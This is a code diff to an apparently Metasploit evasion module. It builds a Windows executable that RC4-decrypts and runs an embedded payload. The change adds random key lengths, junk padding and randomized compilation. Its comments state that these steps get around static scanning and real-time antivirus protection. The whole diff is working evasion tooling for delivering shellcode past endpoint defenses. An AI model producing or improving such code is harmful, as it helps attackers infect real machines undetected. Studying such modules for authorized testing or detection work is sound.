@@ -28,29 +28,27 @@ class MetasploitModule < Msf::Evasion
   end
 
   def rc4_key
-    @rc4_key ||= Rex::Text.rand_text_alpha(32)
+    @rc4_key ||= Rex::Text.rand_text_alpha(32..64)
   end
 
   def get_payload
     @c_payload ||= lambda {
       opts = { format: 'rc4', key: rc4_key }
-      p = payload
+      junk = Rex::Text.rand_text(10..1024)
+      p = payload.encoded + junk
 
       return {
-        size: p.encoded.length,
-        c_format: Msf::Simple::Buffer.transform(p.encoded, 'c', 'buf', opts)
+        size: p.length,
+        c_format: Msf::Simple::Buffer.transform(p, 'c', 'buf', opts)
       }
     }.call
-  end
-
-  def primer
-    print_status("test")
   end
 
   def c_template
     @c_template ||= %Q|#include <Windows.h>
 #include <rc4.h>
 
+// The encrypted code allows us to get around static scanning
 #{get_payload[:c_format]}
 
 int main() {
@@ -59,11 +57,12 @@ int main() {
   memset(lpBuf, '\\0', lpBufSize);
 
   HANDLE proc = OpenProcess(0x1F0FFF, false, 4);
+  // Checking NULL allows us to get around Real-time protection
   if (proc == NULL) {
     RC4("#{rc4_key}", buf, (char*) lpBuf, #{get_payload[:size]});
     void (*func)();
     func = (void (*)()) lpBuf;
-   (void)(*func)();
+    (void)(*func)();
   }
 
   return 0;
@@ -72,6 +71,7 @@ int main() {
 
   def run
     vprint_line c_template
+    # The randomized code allows us to generate a unique EXE
     bin = Metasploit::Framework::Compiler::Windows.compile_random_c(c_template)
     print_status("Compiled executable size: #{bin.length}")
     file_create(bin)
